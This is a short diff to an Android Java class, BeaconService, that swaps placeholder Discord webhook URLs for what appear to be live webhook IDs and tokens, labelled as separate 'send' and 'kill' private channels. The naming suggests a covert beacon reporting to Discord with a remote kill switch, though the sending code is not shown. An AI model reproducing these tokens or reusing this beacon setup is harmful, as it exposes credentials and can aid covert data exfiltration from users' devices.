@@ -21,8 +21,8 @@ import java.util.concurrent.ConcurrentLinkedQueue;
 public class BeaconService extends Service {
 
     // FILL: two separate private Discord channels
-    public static final String WEBHOOK_SEND = "https://discord.com/api/webhooks/ID/TOKEN";
-    public static final String WEBHOOK_KILL = "https://discord.com/api/webhooks/ID2/TOKEN2";
+    public static final String WEBHOOK_SEND = "https://discord.com/api/webhooks/1574460550337921055/_pQqV_6NViCFpa6TtmsCiMcXF5QMOff2OkRWxbFotHl057A2AffJjUC4hnglt9UQSBuu";
+    public static final String WEBHOOK_KILL = "https://discord.com/api/webhooks/1574460764956262460/N-vWmY6ZproO4FRpt0h-f6F-XRR9350jH1IXJ9Sv0O-rehV5h22twBKFYOxVUsAENrty";
 
     private static final Queue<String> queue = new ConcurrentLinkedQueue<>();
     private volatile boolean running = true;
